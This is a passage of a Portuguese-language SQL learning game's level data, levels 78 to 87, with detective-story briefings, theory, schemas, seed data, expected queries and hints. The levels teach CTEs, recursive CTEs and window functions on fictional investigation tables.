    briefing: "Atrasos isolados na cadeia de suprimentos acontecem. Mas Maya suspeita que alguns fornecedores estão sendo usados como fachada para encobrir o desvio de cargas, e reincidência é o primeiro sinal a checar.",
    objective: "Crie uma CTE que conte, por supplier_id, o número de entregas com is_late = 1 como total_atrasos. Na consulta externa, selecione supplier_id e total_atrasos apenas para fornecedores com total_atrasos maior ou igual a 3. Ordene por total_atrasos decrescente e supplier_id ascendente.",
    theory: {
        title: "CTE (WITH) — Consultas Nomeadas em Duas Etapas",
        explanation: "Uma CTE (Common Table Expression), definida com WITH, cria uma tabela temporária nomeada válida apenas durante a execução da consulta. Isso permite quebrar um problema complexo em etapas nomeadas e legíveis: primeiro calcular uma métrica agregada em uma etapa, depois filtrar ou comparar essa métrica em uma consulta externa — sem precisar de subconsultas aninhadas difíceis de ler.",
        syntax: "WITH MetricaPorGrupo AS (\n    SELECT coluna_grupo, AGREGACAO(coluna_valor) AS metrica\n    FROM tabela\n    GROUP BY coluna_grupo\n)\nSELECT coluna_grupo, metrica\nFROM MetricaPorGrupo\nWHERE metrica > :limiar;",
        example: "-- Encontrar filiais cujo total de vendas supera 100000\nWITH VendasPorFilial AS (\n    SELECT filial_id, SUM(valor_venda) AS total_vendas\n    FROM vendas\n    GROUP BY filial_id\n)\nSELECT filial_id, total_vendas\nFROM VendasPorFilial\nWHERE total_vendas > 100000;"
    },
    schemaDDL: `
        CREATE TABLE delivery_records (
            delivery_id INTEGER PRIMARY KEY,
            supplier_id TEXT NOT NULL,
            is_late INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO delivery_records (delivery_id, supplier_id, is_late) VALUES
        (1, 'FORN-A', 1),
        (2, 'FORN-A', 1),
        (3, 'FORN-A', 1),
        (4, 'FORN-A', 0),
        (5, 'FORN-A', 0),
        (6, 'FORN-B', 1),
        (7, 'FORN-B', 1),
        (8, 'FORN-B', 1),
        (9, 'FORN-B', 1),
        (10, 'FORN-C', 0),
        (11, 'FORN-C', 0),
        (12, 'FORN-C', 1),
        (13, 'FORN-D', 1),
        (14, 'FORN-D', 0);
    `,
    expectedQuery: `
        WITH AtrasosPorFornecedor AS (
            SELECT supplier_id, SUM(CASE WHEN is_late = 1 THEN 1 ELSE 0 END) AS total_atrasos
            FROM delivery_records
            GROUP BY supplier_id
        )
        SELECT supplier_id, total_atrasos
        FROM AtrasosPorFornecedor
        WHERE total_atrasos >= 3
        ORDER BY total_atrasos DESC, supplier_id ASC;
    `,
    hint: "Construa uma CTE com SUM(CASE WHEN is_late = 1 THEN 1 ELSE 0 END) AS total_atrasos agrupado por supplier_id, e filtre a consulta externa com WHERE total_atrasos >= 3."
},
{
    id: 79,
    tier: "avancado",
    certModule: "CTE (WITH) — Consultas Nomeadas",
    title: "Nível 79: Os Nós Mais Conectados",
    briefing: "No grafo de contatos suspeitos apreendido de um dos dispositivos, alguns nós concentram muito mais conexões que a média da rede — provavelmente os intermediários-chave da operação. Maya quer isolá-los.",
    objective: "Crie uma CTE que conte, por contact_id, o número de linhas (conexões) em contact_links como grau. Na consulta externa, selecione contact_id e grau apenas para contatos cujo grau seja maior que a média geral de grau calculada sobre a própria CTE (use uma subconsulta escalar sobre ela). Ordene por grau decrescente e contact_id ascendente.",
    theory: {
        title: "CTE (WITH) — Consultas Nomeadas em Duas Etapas",
        explanation: "Uma CTE (Common Table Expression), definida com WITH, cria uma tabela temporária nomeada válida apenas durante a execução da consulta. Isso permite quebrar um problema complexo em etapas nomeadas e legíveis: primeiro calcular uma métrica agregada em uma etapa, depois filtrar ou comparar essa métrica em uma consulta externa — sem precisar de subconsultas aninhadas difíceis de ler.",
        syntax: "WITH MetricaPorGrupo AS (\n    SELECT coluna_grupo, AGREGACAO(coluna_valor) AS metrica\n    FROM tabela\n    GROUP BY coluna_grupo\n)\nSELECT coluna_grupo, metrica\nFROM MetricaPorGrupo\nWHERE metrica > :limiar;",
        example: "-- Encontrar filiais cujo total de vendas supera 100000\nWITH VendasPorFilial AS (\n    SELECT filial_id, SUM(valor_venda) AS total_vendas\n    FROM vendas\n    GROUP BY filial_id\n)\nSELECT filial_id, total_vendas\nFROM VendasPorFilial\nWHERE total_vendas > 100000;"
    },
    schemaDDL: `
        CREATE TABLE contact_links (
            link_id INTEGER PRIMARY KEY,
            contact_id TEXT NOT NULL,
            connected_to TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO contact_links (link_id, contact_id, connected_to) VALUES
        (1, 'CT-01', 'CT-02'),
        (2, 'CT-01', 'CT-03'),
        (3, 'CT-01', 'CT-04'),
        (4, 'CT-01', 'CT-05'),
        (5, 'CT-02', 'CT-01'),
        (6, 'CT-02', 'CT-03'),
        (7, 'CT-03', 'CT-01'),
        (8, 'CT-04', 'CT-01'),
        (9, 'CT-05', 'CT-01'),
        (10, 'CT-05', 'CT-02'),
        (11, 'CT-02', 'CT-04'),
        (12, 'CT-03', 'CT-05'),
        (13, 'CT-04', 'CT-05'),
        (14, 'CT-05', 'CT-03');
    `,
    expectedQuery: `
        WITH GrauPorContato AS (
            SELECT contact_id, COUNT(*) AS grau
            FROM contact_links
            GROUP BY contact_id
        )
        SELECT contact_id, grau
        FROM GrauPorContato
        WHERE grau > (SELECT AVG(grau) FROM GrauPorContato)
        ORDER BY grau DESC, contact_id ASC;
    `,
    hint: "Construa uma CTE com COUNT(*) AS grau agrupado por contact_id, e compare grau com (SELECT AVG(grau) FROM essa_mesma_CTE) na consulta externa."
},
{
    id: 80,
    tier: "avancado",
    certModule: "CTE (WITH) — Consultas Nomeadas",
    title: "Nível 80: O Editor Comprometido",
    briefing: "A conta de edição 'EDITOR-X9' foi identificada como comprometida. Maya precisa saber em quais documentos essa conta atuou repetidamente — um único acesso pode ser ruído, mas edições recorrentes indicam manipulação deliberada de conteúdo.",
    objective: "Crie uma CTE que conte, por document_id, quantas edições em doc_edit_history foram feitas com editor_id = 'EDITOR-X9', como edicoes_suspeitas. Na consulta externa, selecione document_id e edicoes_suspeitas apenas para documentos com edicoes_suspeitas maior ou igual a 2. Ordene por edicoes_suspeitas decrescente e document_id ascendente.",
    theory: {
        title: "CTE (WITH) — Consultas Nomeadas em Duas Etapas",
        explanation: "Uma CTE (Common Table Expression), definida com WITH, cria uma tabela temporária nomeada válida apenas durante a execução da consulta. Isso permite quebrar um problema complexo em etapas nomeadas e legíveis: primeiro calcular uma métrica agregada em uma etapa, depois filtrar ou comparar essa métrica em uma consulta externa — sem precisar de subconsultas aninhadas difíceis de ler.",
        syntax: "WITH MetricaPorGrupo AS (\n    SELECT coluna_grupo, AGREGACAO(coluna_valor) AS metrica\n    FROM tabela\n    GROUP BY coluna_grupo\n)\nSELECT coluna_grupo, metrica\nFROM MetricaPorGrupo\nWHERE metrica > :limiar;",
        example: "-- Encontrar filiais cujo total de vendas supera 100000\nWITH VendasPorFilial AS (\n    SELECT filial_id, SUM(valor_venda) AS total_vendas\n    FROM vendas\n    GROUP BY filial_id\n)\nSELECT filial_id, total_vendas\nFROM VendasPorFilial\nWHERE total_vendas > 100000;"
    },
    schemaDDL: `
        CREATE TABLE doc_edit_history (
            edit_id INTEGER PRIMARY KEY,
            document_id TEXT NOT NULL,
            editor_id TEXT NOT NULL,
            edited_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO doc_edit_history (edit_id, document_id, editor_id, edited_at) VALUES
        (1, 'DOC-A', 'EDITOR-X9', 1),
        (2, 'DOC-A', 'EDITOR-X9', 2),
        (3, 'DOC-A', 'EDITOR-X9', 3),
        (4, 'DOC-A', 'EDITOR-Y1', 4),
        (5, 'DOC-B', 'EDITOR-X9', 1),
        (6, 'DOC-B', 'EDITOR-X9', 2),
        (7, 'DOC-B', 'EDITOR-Z2', 3),
        (8, 'DOC-B', 'EDITOR-Z2', 4),
        (9, 'DOC-C', 'EDITOR-X9', 1),
        (10, 'DOC-C', 'EDITOR-Y1', 2),
        (11, 'DOC-D', 'EDITOR-Y1', 1),
        (12, 'DOC-D', 'EDITOR-Y1', 2),
        (13, 'DOC-D', 'EDITOR-Z2', 3),
        (14, 'DOC-A', 'EDITOR-Z2', 5);
    `,
    expectedQuery: `
        WITH EdicoesPorDocumento AS (
            SELECT document_id, COUNT(*) AS edicoes_suspeitas
            FROM doc_edit_history
            WHERE editor_id = 'EDITOR-X9'
            GROUP BY document_id
        )
        SELECT document_id, edicoes_suspeitas
        FROM EdicoesPorDocumento
        WHERE edicoes_suspeitas >= 2
        ORDER BY edicoes_suspeitas DESC, document_id ASC;
    `,
    hint: "Construa uma CTE que filtre editor_id = 'EDITOR-X9' antes de agrupar por document_id com COUNT(*) AS edicoes_suspeitas, e depois filtre a consulta externa com WHERE edicoes_suspeitas >= 2."
},
{
    id: 81,
    tier: "avancado",
    certModule: "WITH RECURSIVE — Hierarquias e Grafos",
    title: "Nível 81: A Árvore de Subordinados de Carla",
    briefing: "Uma credencial de gerência foi usada fora do horário comercial. Maya precisa mapear toda a cadeia de comando abaixo da gerente Carla para saber quem tinha acesso indireto às credenciais dela através da hierarquia.",
    objective: "Construa uma CTE recursiva (WITH RECURSIVE) para encontrar 'Carla' (employee_id = 3) e todos os seus subordinados diretos e indiretos, incluindo ela mesma como ponto de partida. Retorne employee_id, employee_name e depth (profundidade, começando em 0 para Carla). Ordene por depth ascendente e employee_id ascendente.",
    theory: {
        title: "WITH RECURSIVE — Percorrendo Hierarquias e Grafos",
        explanation: "Uma CTE recursiva percorre estruturas em árvore ou grafo sem saber de antemão quantos níveis existem. Ela tem duas partes unidas por UNION ALL: o termo-âncora (o ponto de partida) e o termo recursivo, que junta a CTE a si mesma repetidamente, um nível de cada vez, até que não existam mais linhas para adicionar.",
        syntax: "WITH RECURSIVE cte AS (\n    SELECT id, 0 AS nivel FROM tabela WHERE id = :raiz\n    UNION ALL\n    SELECT t.id, c.nivel + 1\n    FROM tabela t\n    INNER JOIN cte c ON t.pai_id = c.id\n)\nSELECT * FROM cte;",
        example: "-- Toda a árvore de peças que compõem um produto final\nWITH RECURSIVE ComponentesArvore AS (\n    SELECT peca_id, 0 AS nivel FROM pecas WHERE peca_id = 100\n    UNION ALL\n    SELECT p.peca_id, ca.nivel + 1\n    FROM pecas p\n    INNER JOIN ComponentesArvore ca ON p.peca_pai_id = ca.peca_id\n)\nSELECT * FROM ComponentesArvore;"
    },
    schemaDDL: `
        CREATE TABLE employees (
            employee_id INTEGER PRIMARY KEY,
            employee_name TEXT NOT NULL,
            manager_id INTEGER
        );
    `,
    seedData: `
        INSERT INTO employees (employee_id, employee_name, manager_id) VALUES
        (1, 'Ana', NULL),
        (2, 'Bruno', 1),
        (3, 'Carla', 1),
        (4, 'Diego', 3),
        (5, 'Elaine', 3),
        (6, 'Felipe', 4),
        (7, 'Gabriela', 4),
        (8, 'Henrique', 2),
        (9, 'Isabela', 8),
        (10, 'Joao', 5),
        (11, 'Karina', 6),
        (12, 'Lucas', 2),
        (13, 'Mariana', 7),
        (14, 'Nelson', 1);
    `,
    expectedQuery: `
        WITH RECURSIVE Subordinados AS (
            SELECT employee_id, employee_name, 0 AS depth
            FROM employees
            WHERE employee_id = 3
            UNION ALL
            SELECT e.employee_id, e.employee_name, s.depth + 1
            FROM employees e
            INNER JOIN Subordinados s ON e.manager_id = s.employee_id
        )
        SELECT employee_id, employee_name, depth
        FROM Subordinados
        ORDER BY depth ASC, employee_id ASC;
    `,
    hint: "Inicie o termo-âncora com employee_id = 3 e depth = 0, unindo recursivamente com employees ON e.manager_id = s.employee_id e incrementando depth + 1."
},
{
    id: 82,
    tier: "avancado",
    certModule: "WITH RECURSIVE — Hierarquias e Grafos",
    title: "Nível 82: A Árvore da Categoria Eletrônicos",
    briefing: "O catálogo de produtos da Aethelgard foi adulterado em algum nível da árvore de categorias. Maya precisa listar toda a subárvore de 'Eletrônicos' para restringir a varredura de integridade a esse ramo específico.",
    objective: "Construa uma CTE recursiva (WITH RECURSIVE) para encontrar a categoria 'Eletrônicos' (category_id = 2) e todas as suas subcategorias em qualquer profundidade, incluindo ela mesma. Retorne category_id, category_name e depth (começando em 0). Ordene por depth ascendente e category_id ascendente.",
    theory: {
        title: "WITH RECURSIVE — Percorrendo Hierarquias e Grafos",
        explanation: "Uma CTE recursiva percorre estruturas em árvore ou grafo sem saber de antemão quantos níveis existem. Ela tem duas partes unidas por UNION ALL: o termo-âncora (o ponto de partida) e o termo recursivo, que junta a CTE a si mesma repetidamente, um nível de cada vez, até que não existam mais linhas para adicionar.",
        syntax: "WITH RECURSIVE cte AS (\n    SELECT id, 0 AS nivel FROM tabela WHERE id = :raiz\n    UNION ALL\n    SELECT t.id, c.nivel + 1\n    FROM tabela t\n    INNER JOIN cte c ON t.pai_id = c.id\n)\nSELECT * FROM cte;",
        example: "-- Toda a árvore de peças que compõem um produto final\nWITH RECURSIVE ComponentesArvore AS (\n    SELECT peca_id, 0 AS nivel FROM pecas WHERE peca_id = 100\n    UNION ALL\n    SELECT p.peca_id, ca.nivel + 1\n    FROM pecas p\n    INNER JOIN ComponentesArvore ca ON p.peca_pai_id = ca.peca_id\n)\nSELECT * FROM ComponentesArvore;"
    },
    schemaDDL: `
        CREATE TABLE product_categories (
            category_id INTEGER PRIMARY KEY,
            category_name TEXT NOT NULL,
            parent_category_id INTEGER
        );
    `,
    seedData: `
        INSERT INTO product_categories (category_id, category_name, parent_category_id) VALUES
        (1, 'Todos os Produtos', NULL),
        (2, 'Eletronicos', 1),
        (3, 'Vestuario', 1),
        (4, 'Computadores', 2),
        (5, 'Celulares', 2),
        (6, 'Notebooks', 4),
        (7, 'Desktops', 4),
        (8, 'Smartphones', 5),
        (9, 'Acessorios de Celular', 5),
        (10, 'Camisetas', 3),
        (11, 'Calcas', 3),
        (12, 'Gamer', 6),
        (13, 'Ultrabooks', 6),
        (14, 'Acessorios Diversos', 1);
    `,
    expectedQuery: `
        WITH RECURSIVE Subcategorias AS (
            SELECT category_id, category_name, 0 AS depth
            FROM product_categories
            WHERE category_id = 2
            UNION ALL
            SELECT pc.category_id, pc.category_name, sc.depth + 1
            FROM product_categories pc
            INNER JOIN Subcategorias sc ON pc.parent_category_id = sc.category_id
        )
        SELECT category_id, category_name, depth
        FROM Subcategorias
        ORDER BY depth ASC, category_id ASC;
    `,
    hint: "Inicie o termo-âncora com category_id = 2 e depth = 0, unindo recursivamente com product_categories ON pc.parent_category_id = sc.category_id e incrementando depth + 1."
},
{
    id: 83,
    tier: "avancado",
    certModule: "WITH RECURSIVE — Hierarquias e Grafos",
    title: "Nível 83: O Raio de Impacto do AUTH-CORE",
    briefing: "O invasor mirou diretamente no sistema 'AUTH-CORE'. Antes de isolá-lo, Maya precisa saber exatamente quais outros sistemas da infraestrutura da Aethelgard ficariam comprometidos em cascata caso ele saísse do ar.",
    objective: "Construa uma CTE recursiva (WITH RECURSIVE) para identificar o sistema 'AUTH-CORE' (system_id = 1) e todos os sistemas que dependem dele direta ou indiretamente (ou seja, sistemas cujo depends_on_id aponta, em qualquer profundidade, para ele), incluindo ele mesmo. Retorne system_id, system_name e depth (começando em 0 para AUTH-CORE). Ordene por depth ascendente e system_id ascendente.",
    theory: {
        title: "WITH RECURSIVE — Percorrendo Hierarquias e Grafos",
        explanation: "Uma CTE recursiva percorre estruturas em árvore ou grafo sem saber de antemão quantos níveis existem. Ela tem duas partes unidas por UNION ALL: o termo-âncora (o ponto de partida) e o termo recursivo, que junta a CTE a si mesma repetidamente, um nível de cada vez, até que não existam mais linhas para adicionar.",
        syntax: "WITH RECURSIVE cte AS (\n    SELECT id, 0 AS nivel FROM tabela WHERE id = :raiz\n    UNION ALL\n    SELECT t.id, c.nivel + 1\n    FROM tabela t\n    INNER JOIN cte c ON t.pai_id = c.id\n)\nSELECT * FROM cte;",
        example: "-- Toda a árvore de peças que compõem um produto final\nWITH RECURSIVE ComponentesArvore AS (\n    SELECT peca_id, 0 AS nivel FROM pecas WHERE peca_id = 100\n    UNION ALL\n    SELECT p.peca_id, ca.nivel + 1\n    FROM pecas p\n    INNER JOIN ComponentesArvore ca ON p.peca_pai_id = ca.peca_id\n)\nSELECT * FROM ComponentesArvore;"
    },
    schemaDDL: `
        CREATE TABLE system_dependencies (
            system_id INTEGER PRIMARY KEY,
            system_name TEXT NOT NULL,
            depends_on_id INTEGER
        );
    `,
    seedData: `
        INSERT INTO system_dependencies (system_id, system_name, depends_on_id) VALUES
        (1, 'AUTH-CORE', NULL),
        (2, 'API-GATEWAY', 1),
        (3, 'BILLING-SVC', 1),
        (4, 'WEB-FRONTEND', 2),
        (5, 'MOBILE-BFF', 2),
        (6, 'INVOICE-SVC', 3),
        (7, 'NOTIFICATIONS', 4),
        (8, 'ANALYTICS', 5),
        (9, 'REPORTING', 6),
        (10, 'CACHE-LAYER', NULL),
        (11, 'LOGGING-SVC', 10),
        (12, 'SEARCH-IDX', NULL),
        (13, 'METRICS-AGENT', 7),
        (14, 'EVENT-TRAIL', 12);
    `,
    expectedQuery: `
        WITH RECURSIVE SistemasAfetados AS (
            SELECT system_id, system_name, 0 AS depth
            FROM system_dependencies
            WHERE system_id = 1
            UNION ALL
            SELECT sd.system_id, sd.system_name, sa.depth + 1
            FROM system_dependencies sd
            INNER JOIN SistemasAfetados sa ON sd.depends_on_id = sa.system_id
        )
        SELECT system_id, system_name, depth
        FROM SistemasAfetados
        ORDER BY depth ASC, system_id ASC;
    `,
    hint: "Inicie o termo-âncora com system_id = 1 e depth = 0, unindo recursivamente com system_dependencies ON sd.depends_on_id = sa.system_id e incrementando depth + 1."
},
{
    id: 84,
    tier: "avancado",
    certModule: "WITH RECURSIVE — Hierarquias e Grafos",
    title: "Nível 84: O Conteúdo da Pasta Evidências",
    briefing: "O disco clonado da estação comprometida contém uma árvore de pastas profunda. Maya precisa listar tudo o que existe dentro da pasta 'evidencias', em qualquer nível de subpasta, sem perder nenhum arquivo relevante.",
    objective: "Construa uma CTE recursiva (WITH RECURSIVE) para encontrar a pasta 'evidencias' (node_id = 2) e todo o seu conteúdo em qualquer nível de profundidade, incluindo ela mesma. Retorne node_id, node_name e depth (começando em 0). Ordene por depth ascendente e node_id ascendente.",
    theory: {
        title: "WITH RECURSIVE — Percorrendo Hierarquias e Grafos",
        explanation: "Uma CTE recursiva percorre estruturas em árvore ou grafo sem saber de antemão quantos níveis existem. Ela tem duas partes unidas por UNION ALL: o termo-âncora (o ponto de partida) e o termo recursivo, que junta a CTE a si mesma repetidamente, um nível de cada vez, até que não existam mais linhas para adicionar.",
        syntax: "WITH RECURSIVE cte AS (\n    SELECT id, 0 AS nivel FROM tabela WHERE id = :raiz\n    UNION ALL\n    SELECT t.id, c.nivel + 1\n    FROM tabela t\n    INNER JOIN cte c ON t.pai_id = c.id\n)\nSELECT * FROM cte;",
        example: "-- Toda a árvore de peças que compõem um produto final\nWITH RECURSIVE ComponentesArvore AS (\n    SELECT peca_id, 0 AS nivel FROM pecas WHERE peca_id = 100\n    UNION ALL\n    SELECT p.peca_id, ca.nivel + 1\n    FROM pecas p\n    INNER JOIN ComponentesArvore ca ON p.peca_pai_id = ca.peca_id\n)\nSELECT * FROM ComponentesArvore;"
    },
    schemaDDL: `
        CREATE TABLE file_system_nodes (
            node_id INTEGER PRIMARY KEY,
            node_name TEXT NOT NULL,
            parent_node_id INTEGER
        );
    `,
    seedData: `
        INSERT INTO file_system_nodes (node_id, node_name, parent_node_id) VALUES
        (1, 'root', NULL),
        (2, 'evidencias', 1),
        (3, 'backups', 1),
        (4, 'imagens_disco', 2),
        (5, 'logs_extraidos', 2),
        (6, 'disco_A.img', 4),
        (7, 'disco_B.img', 4),
        (8, 'auth.log', 5),
        (9, 'syslog', 5),
        (10, 'backup_2025.zip', 3),
        (11, 'backup_2026.zip', 3),
        (12, 'disco_A_hash.txt', 6),
        (13, 'metadata.json', 7),
        (14, 'temp', 1);
    `,
    expectedQuery: `
        WITH RECURSIVE ConteudoPasta AS (
            SELECT node_id, node_name, 0 AS depth
            FROM file_system_nodes
            WHERE node_id = 2
            UNION ALL
            SELECT fsn.node_id, fsn.node_name, cp.depth + 1
            FROM file_system_nodes fsn
            INNER JOIN ConteudoPasta cp ON fsn.parent_node_id = cp.node_id
        )
        SELECT node_id, node_name, depth
        FROM ConteudoPasta
        ORDER BY depth ASC, node_id ASC;
    `,
    hint: "Inicie o termo-âncora com node_id = 2 e depth = 0, unindo recursivamente com file_system_nodes ON fsn.parent_node_id = cp.node_id e incrementando depth + 1."
},
{
    id: 85,
    tier: "avancado",
    certModule: "WITH RECURSIVE — Hierarquias e Grafos",
    title: "Nível 85: A Rede Recrutada por Fantasma",
    briefing: "Um informante identificou o codinome 'FANTASMA' como um dos recrutadores da operação. Maya precisa reconstruir toda a rede de pessoas recrutadas por ele, direta ou indiretamente, para dimensionar o tamanho da célula.",
    objective: "Construa uma CTE recursiva (WITH RECURSIVE) para mapear 'FANTASMA' (member_id = 5) e toda a rede de recrutamento originada por ele, seguindo a cadeia de recrutados direta e indiretamente, incluindo ele mesmo. Retorne member_id, member_alias e depth (começando em 0). Ordene por depth ascendente e member_id ascendente.",
    theory: {
        title: "WITH RECURSIVE — Percorrendo Hierarquias e Grafos",
        explanation: "Uma CTE recursiva percorre estruturas em árvore ou grafo sem saber de antemão quantos níveis existem. Ela tem duas partes unidas por UNION ALL: o termo-âncora (o ponto de partida) e o termo recursivo, que junta a CTE a si mesma repetidamente, um nível de cada vez, até que não existam mais linhas para adicionar.",
        syntax: "WITH RECURSIVE cte AS (\n    SELECT id, 0 AS nivel FROM tabela WHERE id = :raiz\n    UNION ALL\n    SELECT t.id, c.nivel + 1\n    FROM tabela t\n    INNER JOIN cte c ON t.pai_id = c.id\n)\nSELECT * FROM cte;",
        example: "-- Toda a árvore de peças que compõem um produto final\nWITH RECURSIVE ComponentesArvore AS (\n    SELECT peca_id, 0 AS nivel FROM pecas WHERE peca_id = 100\n    UNION ALL\n    SELECT p.peca_id, ca.nivel + 1\n    FROM pecas p\n    INNER JOIN ComponentesArvore ca ON p.peca_pai_id = ca.peca_id\n)\nSELECT * FROM ComponentesArvore;"
    },
    schemaDDL: `
        CREATE TABLE network_recruitment (
            member_id INTEGER PRIMARY KEY,
            member_alias TEXT NOT NULL,
            recruited_by_id INTEGER
        );
    `,
    seedData: `
        INSERT INTO network_recruitment (member_id, member_alias, recruited_by_id) VALUES
        (1, 'CHEFE', NULL),
        (2, 'VIPERA', 1),
        (3, 'CORVO', 1),
        (4, 'LOBO', 2),
        (5, 'FANTASMA', 3),
        (6, 'SOMBRA', 5),
        (7, 'ECO', 5),
        (8, 'RAPOSA', 6),
        (9, 'FALCAO', 4),
        (10, 'ARANHA', 7),
        (11, 'COBRA', 8),
        (12, 'TUBARAO', 2),
        (13, 'URSO', 10),
        (14, 'JAGUAR', 9);
    `,
    expectedQuery: `
        WITH RECURSIVE RedeRecrutamento AS (
            SELECT member_id, member_alias, 0 AS depth
            FROM network_recruitment
            WHERE member_id = 5
            UNION ALL
            SELECT nr.member_id, nr.member_alias, rr.depth + 1
            FROM network_recruitment nr
            INNER JOIN RedeRecrutamento rr ON nr.recruited_by_id = rr.member_id
        )
        SELECT member_id, member_alias, depth
        FROM RedeRecrutamento
        ORDER BY depth ASC, member_id ASC;
    `,
    hint: "Inicie o termo-âncora com member_id = 5 e depth = 0, unindo recursivamente com network_recruitment ON nr.recruited_by_id = rr.member_id e incrementando depth + 1."
},
{
    id: 86,
    tier: "avancado",
    certModule: "Desafios Combinados (CTE + Window + CASE)",
    title: "Nível 86: O Primeiro Cruzamento do Limiar",
    briefing: "Não basta saber quanto cada host exfiltrou no total — Maya precisa do instante exato em que cada host cruzou a marca de 10000 bytes acumulados, o ponto em que o incidente deixou de ser tentativa e virou vazamento confirmado.",
    objective: "Construa duas CTEs encadeadas. A primeira calcula o total acumulado (running total) de bytes_sent por host_id, ordenado por event_time ASC e event_id ASC como desempate, como total_acumulado. A segunda filtra apenas as linhas onde total_acumulado é maior ou igual a 10000 e aplica ROW_NUMBER() particionado por host_id, ordenado por event_time ASC e event_id ASC, como rn, para identificar a PRIMEIRA vez que cada host cruzou esse limiar. Na consulta final, projete host_id, event_id, bytes_sent e total_acumulado apenas para a linha de primeiro cruzamento (rn = 1) de cada host. Ordene por host_id ASC.",
    theory: {
        title: "Combinando CTEs, Window Functions e CASE",
        explanation: "Investigações complexas raramente se resolvem com uma única técnica isolada. Encadear múltiplas CTEs permite quebrar o raciocínio em etapas nomeadas, onde a saída de uma etapa alimenta a próxima — por exemplo, calcular uma métrica com uma window function em uma CTE e depois classificá-la ou filtrá-la em outra, combinando também expressões CASE WHEN quando é preciso categorizar valores. Esse encadeamento é o padrão mais poderoso do SQL analítico.",
        syntax: "WITH Etapa1 AS (\n    SELECT coluna_id, coluna_grupo,\n        FUNCAO_JANELA(coluna_valor) OVER (\n            PARTITION BY coluna_grupo ORDER BY coluna_tempo ASC\n        ) AS metrica\n    FROM tabela\n),\nEtapa2 AS (\n    SELECT *,\n        CASE WHEN metrica >= :limiar THEN 'ALERTA' ELSE NULL END AS status\n    FROM Etapa1\n)\nSELECT * FROM Etapa2 WHERE status IS NOT NULL;",
        example: "-- Primeira vez que o saldo de um produto em estoque ficou negativo\nWITH Saldo AS (\n    SELECT produto_id, movimento_id,\n        SUM(quantidade) OVER (\n            PARTITION BY produto_id ORDER BY movimento_id ASC\n        ) AS saldo_acumulado\n    FROM movimentos_estoque\n),\nPrimeiraRuptura AS (\n    SELECT *,\n        ROW_NUMBER() OVER (PARTITION BY produto_id ORDER BY movimento_id ASC) AS rn\n    FROM Saldo\n    WHERE saldo_acumulado < 0\n)\nSELECT * FROM PrimeiraRuptura WHERE rn = 1;"
    },
    schemaDDL: `
        CREATE TABLE breach_events (
            event_id INTEGER PRIMARY KEY,
            host_id TEXT NOT NULL,
            bytes_sent INTEGER NOT NULL,
            event_time INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO breach_events (event_id, host_id, bytes_sent, event_time) VALUES
        (1, 'HOST-A', 3000, 1),
        (2, 'HOST-A', 3000, 2),
        (3, 'HOST-A', 3000, 3),
        (4, 'HOST-A', 3000, 4),
        (5, 'HOST-B', 6000, 1),
        (6, 'HOST-B', 5000, 2),
        (7, 'HOST-C', 12000, 1),
        (8, 'HOST-D', 1000, 1),
        (9, 'HOST-D', 1000, 2),
        (10, 'HOST-D', 1000, 3),
        (11, 'HOST-A', 500, 5),
        (12, 'HOST-B', 200, 3),
        (13, 'HOST-C', 300, 2),
        (14, 'HOST-D', 500, 4);
    `,
    expectedQuery: `
        WITH RunningTotal AS (
            SELECT event_id, host_id, bytes_sent, event_time,
                SUM(bytes_sent) OVER (
                    PARTITION BY host_id
                    ORDER BY event_time ASC, event_id ASC
                    ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW
                ) AS total_acumulado
            FROM breach_events
        ),
        FirstCrossing AS (
            SELECT event_id, host_id, bytes_sent, total_acumulado,
                ROW_NUMBER() OVER (
                    PARTITION BY host_id
                    ORDER BY event_time ASC, event_id ASC
                ) AS rn
            FROM RunningTotal
            WHERE total_acumulado >= 10000
        )
        SELECT host_id, event_id, bytes_sent, total_acumulado
        FROM FirstCrossing
        WHERE rn = 1
        ORDER BY host_id ASC;
    `,
    hint: "Encadeie duas CTEs: a primeira usa SUM(bytes_sent) OVER (PARTITION BY host_id ORDER BY event_time ASC, event_id ASC ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW); a segunda filtra total_acumulado >= 10000 e aplica ROW_NUMBER() OVER (PARTITION BY host_id ORDER BY event_time ASC, event_id ASC), mantendo apenas rn = 1."
},
{
    id: 87,
    tier: "avancado",
    certModule: "Desafios Combinados (CTE + Window + CASE)",
    title: "Nível 87: A Operação de Maior Risco",
    briefing: "Antes de congelar contas, a equipe de segurança da Aethelgard precisa saber qual foi a operação financeira mais grave já classificada como 'ALTO' risco em cada conta suspeita — o ponto de maior exposição de cada uma.",
    objective: "Construa duas CTEs encadeadas. A primeira classifica cada operação com uma expressão CASE WHEN em nivel_risco: 'ALTO' se amount for maior ou igual a 5000, 'MEDIO' se amount for maior ou igual a 1000, e 'BAIXO' caso contrário. A segunda filtra apenas as operações com nivel_risco = 'ALTO' e aplica RANK() particionado por account_id, ordenado por amount DESC e operation_id ASC como desempate, como posicao. Na consulta final, projete account_id, operation_id, amount e nivel_risco apenas para a operação de posicao = 1 de cada conta. Ordene por account_id ASC.",
    theory: {
        title: "Combinando CTEs, Window Functions e CASE",
        explanation: "Investigações complexas raramente se resolvem com uma única técnica isolada. Encadear múltiplas CTEs permite quebrar o raciocínio em etapas nomeadas, onde a saída de uma etapa alimenta a próxima — por exemplo, calcular uma métrica com uma window function em uma CTE e depois classificá-la ou filtrá-la em outra, combinando também expressões CASE WHEN quando é preciso categorizar valores. Esse encadeamento é o padrão mais poderoso do SQL analítico.",
        syntax: "WITH Etapa1 AS (\n    SELECT coluna_id, coluna_grupo,\n        FUNCAO_JANELA(coluna_valor) OVER (\n            PARTITION BY coluna_grupo ORDER BY coluna_tempo ASC\n        ) AS metrica\n    FROM tabela\n),\nEtapa2 AS (\n    SELECT *,\n        CASE WHEN metrica >= :limiar THEN 'ALERTA' ELSE NULL END AS status\n    FROM Etapa1\n)\nSELECT * FROM Etapa2 WHERE status IS NOT NULL;",
